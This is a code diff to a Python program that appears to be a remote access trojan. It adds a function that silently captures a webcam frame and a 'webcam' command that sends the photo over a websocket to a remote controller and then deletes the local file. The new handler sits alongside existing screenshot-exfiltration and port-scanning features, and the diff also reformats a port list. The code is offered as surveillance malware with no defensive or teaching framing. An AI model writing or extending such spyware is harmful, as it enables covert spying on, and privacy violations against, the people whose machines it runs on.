@@ -5,6 +5,7 @@ import pyfiglet
 import socket
 import os
 import threading
+import cv2
 import time
 import sys
 import asyncio
@@ -17,6 +18,17 @@ def alert_message():
     messagebox.showinfo("Warrning", "Are U Sure You are Safe?")
     root.mainloop()
 
+def capture_webcam():
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        print("Cannot access webcam")
+        return
+    ret, frame = cap.read()
+    if ret:
+        cv2.imwrite("capture.jpg", frame)
+    else:
+        print("Failed to capture image")
+    cap.release()
 import pyautogui
 def take_screenshot():
     screenshot = pyautogui.screenshot()
@@ -82,6 +94,10 @@ async def main():
                     take_screenshot()
                     await sendfile("screenshot.png")
                     os.remove("screenshot.png")
+                elif commandlist[0] == 'webcam':
+                    capture_webcam()
+                    await sendfile("capture.jpg")
+                    os.remove("capture.jpg")
                 else:
                     await ws.send(b"Unknown command")
         await myprocess()
@@ -131,7 +147,11 @@ def port_scan():
 
     print(f"\n Scanning ports on {target}...\n")
 
-    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389 ,544, 554,5900, 8080,8000, 8081,3000, 5000, 6379, 11211, 27017,5173, 6379, 8080, 8081, 3000, 5000, 8000, 9000, 9200, 9300, 11211, 27017
+    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443,
+                    3306, 3389 ,544, 554,5900, 8080,8000,
+                    8081,3000, 5000, 6379, 11211, 27017,
+                    5173, 6379, 8080, 8081, 3000, 5000,
+                    8000, 9000, 9200, 9300, 11211, 27017
                     ]
     open_ports = []
 
